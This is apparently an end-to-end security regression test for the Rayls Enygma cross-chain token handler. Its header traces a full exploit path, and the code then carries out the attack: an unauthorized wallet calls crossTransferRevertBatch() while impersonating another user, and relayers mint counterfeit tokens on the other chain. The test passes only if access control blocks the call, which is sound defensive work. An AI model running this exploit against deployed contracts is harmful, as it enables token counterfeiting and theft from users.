/**
 * @title E2E SECURITY: crossTransferRevertBatch() Missing Access Control
 *
 * LIVE EXPLOIT on the real Rayls infrastructure.
 *
 * VULNERABILITY:
 *   RaylsEnygmaHandler.crossTransferRevertBatch() is `public virtual` with NO access
 *   control modifiers (no onlyOwner, no onlyRelayerAuthorized, no nonReentrant).
 *   It constructs a PNHTransfer and calls IEnygmaPNEvents.sendTransferPNH().
 *   msg.sender to PLEvents is the TOKEN CONTRACT (authorized on the endpoint).
 *   PLEvents.onlyAuthorized PASSES → EnygmaSendTransferPNH event emitted.
 *   No tokens are burned.
 *
 * FULL EXPLOIT PATH (traced through relayer code):
 *   1. Attacker on PN-B calls crossTransferRevertBatch(victim, attacker, amount, PL_A, refId)
 *      - _from can be ANY address (no ownership check, no balance check)
 *      - Attacker uses a legitimate user's address as _from to impersonate them
 *   2. No access control → TX succeeds. Calls EnygmaPNEvents.sendTransferPNH().
 *   3. Token IS an authorizedAddress → PLEvents.onlyAuthorized passes.
 *   4. EnygmaSendTransferPNH event emitted on PN-B — IDENTICAL to linearCrossTransfer events.
 *   5. PL-B's source relayer picks up event (cannot distinguish from legitimate transfer).
 *   6. Relayer calls HandleEnygmaCrossTransfer → ExecuteEnygmaCrossTransfer:
 *      - CreateBatchesWithAnonimity groups transfers by chain
 *      - GenerateTransferProof generates ZK proof using PL-B's FinalizedBalance
 *      - Since NO tokens were burned, PL-B's actual balance is FULL → proof PASSES
 *      - SendTransferBatch submits to CC with valid proof
 *   7. CC validates proof → updates PL-B commitment → emits EnygmaTransfer for PL-A
 *   8. PL-A's dest relayer picks up → calls crossMint(attacker, amount) on PN-A
 *   9. RESULT: Tokens minted on PN-A from nothing. Token INFLATION.
 *
 * WHY crossTransferRevertBatch EXISTS:
 *   It is called by the DESTINATION relayer (dest_revert.go) when a crossMint fails
 *   on the destination PN. It sends tokens BACK to the source without burning
 *   (because the tokens were already burned on the source during linearCrossTransfer
 *   and never successfully minted on destination). Only the relayer should call it.
 *
 * EXPECTED BEHAVIOR:
 *   - Test FAILS if unauthorized call succeeds (vulnerability confirmed)
 *   - Test PASSES if unauthorized call reverts (access control applied)
 */

import { ethers } from 'ethers';
import { expect } from 'chai';
import { DEFAULT_TIMEOUT, GAS_LIMIT, LOGGER } from '../../../src/config/env-config';
import { initializePrivacyNodesAndPnh, PrivacyNodeMap } from '../../setup';
import { PrivateHub } from '../../../src/entities/PrivateHub';
import { EnygmaWrapper } from '../../../src/entities/tokens/EnygmaWrapper';
import { eventually, submitTx } from '../../../src/utils/common';
import { createUserOperator } from '../../../src/utils/wallet-factory';
import {
  EndpointV1,
  ProductionEnygmaToken,
  ProductionEnygmaToken__factory,
  RaylsEnygmaHandler__factory,
} from '../../../typechain-types';

const MINT_PND = ethers.parseUnits('50000', 18);    // 50,000 PND minted on PN-A
const TRANSFER_PND = ethers.parseUnits('10000', 18); // 10,000 PND transferred to userC on PN-B
const FORGED_PND = ethers.parseUnits('25000', 18);   // 25,000 PND forged transfer (more than userC has!)

function formatPND(amount: bigint): string {
  return ethers.formatUnits(amount, 18);
}

/**
 * Prints a labelled balance snapshot for PL-A and PL-B, including per-address
 * balances, per-chain supply, and grand total across both chains.
 */
async function printBalanceSnapshot(
  label: string,
  tokenOnA: ProductionEnygmaToken,
  tokenOnB: ProductionEnygmaToken,
  addresses: { name: string; address: string; chain: 'PL-A' | 'PL-B' }[],
) {
  LOGGER.log(`\n   ── ${label} ──`);

  const supplyA = await tokenOnA.totalSupply();
  const supplyB = await tokenOnB.totalSupply();
  const grandTotal = supplyA + supplyB;

  for (const addr of addresses) {
    const token = addr.chain === 'PL-A' ? tokenOnA : tokenOnB;
    const balance = await token.balanceOf(addr.address);
    LOGGER.log(`   ${addr.chain} | ${addr.name.padEnd(20)} ${formatPND(balance).padStart(12)} PND`);
  }

  LOGGER.log(`   ─────────────────────────────────────────`);
  LOGGER.log(`   PL-A | Total Supply           ${formatPND(supplyA).padStart(12)} PND`);
  LOGGER.log(`   PL-B | Total Supply           ${formatPND(supplyB).padStart(12)} PND`);
  LOGGER.log(`   GRAND TOTAL                   ${formatPND(grandTotal).padStart(12)} PND`);

  return { supplyA, supplyB, grandTotal };
}

describe('E2E SECURITY: crossTransferRevertBatch Missing Access Control (LIVE)', function () {
  this.timeout(DEFAULT_TIMEOUT * 3);

  let privacyNodes: PrivacyNodeMap;
  let privateHub: PrivateHub;

  before(async function () {
    const { initializedNodes, initializedPNH } = await initializePrivacyNodesAndPnh(2);
    privacyNodes = initializedNodes;
    privateHub = initializedPNH;
  });

  it('should revert when unauthorized address calls crossTransferRevertBatch()', async function () {
    LOGGER.log('\n═══════════════════════════════════════════════════════════════');
    LOGGER.log('   crossTransferRevertBatch MISSING ACCESS CONTROL');
    LOGGER.log('   Targeting the LIVE Enygma token handler on PN-B');
    LOGGER.log('═══════════════════════════════════════════════════════════════');

    // ─── PHASE 1: Deploy Enygma PND on PN-A, mint to userA, cross-transfer to userB on PN-B ───
    LOGGER.log('\n   PHASE 1: DEPLOY ENYGMA PND ON PL-A & CROSS-TRANSFER TO PL-B');

    const enygma = new EnygmaWrapper<ProductionEnygmaToken>(privacyNodes.A, ProductionEnygmaToken__factory);

    // ─── User wallets ───
    // Node operators have gas for transactions; createUserOperator wallets may have zero balance
    LOGGER.log('\n   SETUP: Setting up user wallets');

    const userA = privacyNodes.A.userWallet;
    const userB = privacyNodes.B.userWallet;
    LOGGER.log(`   userA (PL-A): ${userA.address}  — regular user, token holder`);
    LOGGER.log(`   userB (PL-B): ${userB.address}  — regular user, token recipient`);
    await enygma.deployViaFactory();
    await enygma.activateOnPn();
    await enygma.activateOnHub(privateHub);
    const tokenAAddr = enygma.address[privacyNodes.A.chainId];
    LOGGER.log(`   Enygma PND deployed on PN-A: ${tokenAAddr}`);

    // Manual mint + wait (avoids framework's raw-bigint log messages)
    await submitTx(
      () => enygma.contract.mint(userA.address, MINT_PND, { gasLimit: GAS_LIMIT }),
      `Minting ${formatPND(MINT_PND)} PND to userA on PN-A`
    );
    await eventually<boolean>({
      check: async () => {
        const bal = await enygma.contract.balanceOf(userA.address);
        return bal === MINT_PND;
      },
      message: `Waiting for userA → ${formatPND(MINT_PND)} PND on PN-A`,
    });
    LOGGER.log(`   Minted ${formatPND(MINT_PND)} PND to userA on PN-A`);

    // userA calls linearCrossTransfer to send ALL tokens to userB on PN-B
    const tokenOnA = privacyNodes.A.getContract<ProductionEnygmaToken>(enygma.symbol);
    const tokenOnAAsUserA = tokenOnA.connect(userA) as ProductionEnygmaToken;

    LOGGER.log(`   userA cross-transferring ${formatPND(MINT_PND)} PND to userB on PN-B (chain ${privacyNodes.B.chainId})...`);
    await submitTx(
      () => tokenOnAAsUserA.linearCrossTransfer(
        userB.address,
        MINT_PND,
        privacyNodes.B.chainId,
        [], // plain transfer (no programmability)
        { gasLimit: 5000000 }
      ),
      `Cross-transferring ${formatPND(MINT_PND)} PND from userA on PN-A to userB on PN-B`
    );

    // Wait for token deployment on PN-B
    await eventually<boolean>({
      check: async () => {
        const endpoint = privacyNodes.B.getContract<EndpointV1>('EndpointV1');
        const address = await endpoint.getAddressByResourceId(enygma.resourceId);
        if (address === ethers.ZeroAddress) return false;
        enygma.address[privacyNodes.B.chainId] = address;
        await privacyNodes.B.getContractAt(ProductionEnygmaToken__factory.name, address, enygma.symbol);
        return true;
      },
      message: `Waiting for Enygma PND deployed on PN-B`,
    });

    // Wait for userB balance on PN-B
    const tokenOnB = privacyNodes.B.getContract<ProductionEnygmaToken>(enygma.symbol);
    const tokenBAddr = await tokenOnB.getAddress();

    await eventually<boolean>({
      check: async () => {
        const balance = await tokenOnB.balanceOf(userB.address);
        return balance === MINT_PND;
      },
      message: `Waiting for userB → ${formatPND(MINT_PND)} PND on PN-B`,
    });

    LOGGER.log(`   LIVE Enygma handler on PN-A: ${tokenAAddr}`);
    LOGGER.log(`   LIVE Enygma handler on PN-B: ${tokenBAddr}`);
    LOGGER.log(`   userB received ${formatPND(MINT_PND)} PND on PN-B`);

    // ─── PHASE 2: Create userC & attacker on PN-B ───
    LOGGER.log('\n   PHASE 2: CREATE userC & ATTACKER ON PL-B');

    // userC: a legitimate user on PN-B whose address will be impersonated as _from
    const userCWallet = createUserOperator(privacyNodes.B.provider);

    // userB transfers TRANSFER_PND to userC on PN-B
    const tokenOnBAsUserB = tokenOnB.connect(userB) as ProductionEnygmaToken;
    const transferTx = await tokenOnBAsUserB.transfer(userCWallet.address, TRANSFER_PND, { gasLimit: GAS_LIMIT });
    await transferTx.wait();
    LOGGER.log(`   userC    (PL-B): ${userCWallet.address}`);
    LOGGER.log(`   userB transferred ${formatPND(TRANSFER_PND)} PND to userC on PN-B`);

    // Attacker: unauthorized random address on PN-B
    const attackerWallet = createUserOperator(privacyNodes.B.provider);
    LOGGER.log(`   attacker (PL-B): ${attackerWallet.address}`);

    // Address list for balance snapshots
    const addressList: { name: string; address: string; chain: 'PL-A' | 'PL-B' }[] = [
      { name: 'userA',      address: userA.address,          chain: 'PL-A' },
      { name: 'attacker',   address: attackerWallet.address, chain: 'PL-A' },
      { name: 'userB',      address: userB.address,          chain: 'PL-B' },
      { name: 'userC',      address: userCWallet.address,    chain: 'PL-B' },
      { name: 'attacker',   address: attackerWallet.address, chain: 'PL-B' },
    ];

    // ─── SNAPSHOT: Before attack ───
    const before = await printBalanceSnapshot(
      'BALANCES BEFORE ATTACK', tokenOnA, tokenOnB, addressList
    );

    // Assertions: pre-attack state
    const userBBalBefore = await tokenOnB.balanceOf(userB.address);
    const userCBalBefore = await tokenOnB.balanceOf(userCWallet.address);
    expect(userCBalBefore).to.equal(TRANSFER_PND,
      'PL-B: userC should hold TRANSFER_PND');
    expect(userBBalBefore).to.equal(MINT_PND - TRANSFER_PND,
      'PL-B: userB should hold MINT_PND minus what was transferred to userC');
    expect(before.supplyB).to.equal(MINT_PND,
      'PL-B: total supply should equal full minted amount');
    expect(before.supplyA).to.equal(0n,
      'PL-A: total supply should be 0 (all tokens cross-transferred to PL-B)');

    // ─── PHASE 3: ATTACK — unauthorized crossTransferRevertBatch on PN-B ───
    LOGGER.log('\n   PHASE 3: EXECUTE ATTACK ON LIVE TOKEN HANDLER (PL-B)');
    LOGGER.log(`   Attacker impersonates userC as _from, forges ${formatPND(FORGED_PND)} PND`);
    LOGGER.log(`   Amount exceeds userC's ${formatPND(TRANSFER_PND)} PND balance — no balance check in contract`);

    const handler = RaylsEnygmaHandler__factory.connect(tokenBAddr, attackerWallet);
    const referenceId = ethers.keccak256(ethers.toUtf8Bytes(`forged-revert-batch-${Date.now()}`));

    let attackSucceeded = false;
    let attackError = '';
    try {
      LOGGER.log(`   Attacker calling crossTransferRevertBatch() on PN-B token handler...`);
      LOGGER.log(`     _from:      ${userCWallet.address} (userC on PN-B — impersonated)`);
      LOGGER.log(`     _to:        ${attackerWallet.address} (attacker receives on PN-A)`);
      LOGGER.log(`     _value:     ${formatPND(FORGED_PND)} PND (exceeds userC's ${formatPND(TRANSFER_PND)} PND balance)`);
      LOGGER.log(`     _toChainId: ${privacyNodes.A.chainId} (PL-A)`);

      const tx = await handler.crossTransferRevertBatch(
        userCWallet.address,       // _from: impersonate userC (NOT the caller!)
        attackerWallet.address,    // _to: attacker receives on PN-A
        FORGED_PND,                // _value: more than userC even has
        privacyNodes.A.chainId,      // _toChainId: destination PN-A
        referenceId,               // _referenceId: arbitrary
        { gasLimit: GAS_LIMIT }
      );
      await tx.wait();
      attackSucceeded = true;
      LOGGER.log(`   crossTransferRevertBatch() call succeeded — no access control blocked it`);
    } catch (error: any) {
      attackError = error.message || String(error);
      LOGGER.log(`   Call reverted: ${attackError.slice(0, 200)}`);
    }

    // ─── PHASE 4: WAIT FOR RELAY DELIVERY & VERIFY INFLATION ───
    LOGGER.log('\n   PHASE 4: VERIFY IMPACT ON BOTH CHAINS');

    if (attackSucceeded) {
      // Wait for relay delivery: forged PND should be crossMint'd to attacker on PN-A
      LOGGER.log(`   Waiting for relayer to deliver ${formatPND(FORGED_PND)} PND to attacker on PN-A...`);
      LOGGER.log(`   (Relayer-B picks up event → ZK proof → CC → Relayer-A → crossMint on PN-A)`);

      let relayDelivered = false;
      try {
        await eventually<boolean>({
          check: async () => {
            const attackerBalA = await tokenOnA.balanceOf(attackerWallet.address);
            return attackerBalA > 0n;
          },
          message: `Waiting for forged ${formatPND(FORGED_PND)} PND on PN-A via relay`,
        });
        relayDelivered = true;
        LOGGER.log(`   Relay delivery CONFIRMED — counterfeit tokens arrived on PN-A!`);
      } catch {
        LOGGER.log(`   Relay delivery did not arrive within timeout.`);
        LOGGER.log(`   Check relayer-B logs for errors (e.g., proof generation crash).`);
      }

      // ─── SNAPSHOT: After attack + relay delivery ───
      const after = await printBalanceSnapshot(
        relayDelivered ? 'BALANCES AFTER ATTACK + RELAY DELIVERY' : 'BALANCES AFTER ATTACK (RELAY PENDING)',
        tokenOnA, tokenOnB, addressList
      );

      const userBBalAfter = await tokenOnB.balanceOf(userB.address);
      const userCBalAfter = await tokenOnB.balanceOf(userCWallet.address);
      const attackerBalBAfter = await tokenOnB.balanceOf(attackerWallet.address);
      const attackerBalAAfter = await tokenOnA.balanceOf(attackerWallet.address);

      // Verify: NO tokens burned or moved on PN-B
      expect(after.supplyB).to.equal(before.supplyB,
        'PL-B: total supply must be unchanged — crossTransferRevertBatch does NOT burn');
      expect(userBBalAfter).to.equal(userBBalBefore,
        'PL-B: userB balance must be unchanged');
      expect(userCBalAfter).to.equal(userCBalBefore,
        'PL-B: userC balance must be unchanged — no tokens deducted');
      expect(attackerBalBAfter).to.equal(0n,
        'PL-B: attacker balance must be 0 — they spent nothing');

      if (relayDelivered) {
        // Verify: tokens INFLATED on PN-A
        expect(attackerBalAAfter).to.equal(FORGED_PND,
          'PL-A: attacker should have received FORGED_PND from counterfeit crossMint');
        expect(after.supplyA).to.equal(FORGED_PND,
          'PL-A: supply should have increased by FORGED_PND (counterfeit mint)');
        expect(after.grandTotal).to.equal(before.grandTotal + FORGED_PND,
          'Grand total should have INCREASED — token inflation confirmed');
      }

      LOGGER.log('\n═══════════════════════════════════════════════════════════════');
      LOGGER.log('   VULNERABILITY CONFIRMED (LIVE)');
      LOGGER.log('═══════════════════════════════════════════════════════════════');
      LOGGER.log(`   An UNAUTHORIZED address on PN-B called crossTransferRevertBatch()`);
      LOGGER.log(`   on the LIVE token handler at ${tokenBAddr}`);
      LOGGER.log('');
      LOGGER.log('   ATTACK PARAMETERS:');
      LOGGER.log(`     msg.sender: ${attackerWallet.address} (attacker — random address)`);
      LOGGER.log(`     _from:      ${userCWallet.address} (userC — impersonated)`);
      LOGGER.log(`     _value:     ${formatPND(FORGED_PND)} PND (exceeds userC balance of ${formatPND(TRANSFER_PND)} PND)`);
      LOGGER.log('');
      LOGGER.log('   ON-CHAIN STATE AFTER ATTACK:');
      LOGGER.log(`     PL-A supply:         ${formatPND(after.supplyA)} PND ${relayDelivered ? '(+' + formatPND(FORGED_PND) + ' counterfeit — INFLATED)' : '(relay pending)'}`);
      LOGGER.log(`     PL-B supply:         ${formatPND(after.supplyB)} PND (unchanged — no burn by design, see below)`);
      LOGGER.log(`     PL-A attacker:       ${formatPND(attackerBalAAfter)} PND ${relayDelivered ? '(counterfeit minted by relayer)' : '(relay pending)'}`);
      LOGGER.log(`     PL-B userC:          ${formatPND(userCBalAfter)} PND (unchanged — no tokens taken)`);
      LOGGER.log(`     PL-B attacker:       ${formatPND(attackerBalBAfter)} PND (spent nothing)`);
      LOGGER.log(`     Grand total:         ${formatPND(after.grandTotal)} PND ${relayDelivered ? '(was ' + formatPND(before.grandTotal) + ' — INFLATED by ' + formatPND(after.grandTotal - before.grandTotal) + ')' : ''}`);
      
    } else {
      // Attack was blocked — print snapshot and pass
      await printBalanceSnapshot('BALANCES AFTER ATTACK (BLOCKED)', tokenOnA, tokenOnB, addressList);
    }

    // ASSERTION: the call MUST be rejected by access control
    expect(attackSucceeded).to.equal(
      false,
      `VULNERABILITY CONFIRMED ON LIVE: Unauthorized attacker on PN-B called ` +
      `crossTransferRevertBatch(_from=userC, _to=attacker, ${formatPND(FORGED_PND)} PND) ` +
      `on token handler (${tokenBAddr}). ` +
      `PL-B supply unchanged — no tokens burned. ` +
      `_from is arbitrary, no ownership check. ` +
      `EnygmaSendTransferPNH emitted on PN-B → relayer ZK proof passes → ` +
      `crossMint on PN-A → TOKEN INFLATION. Fix: add onlyRelayerAuthorized.`
    );
  });
});
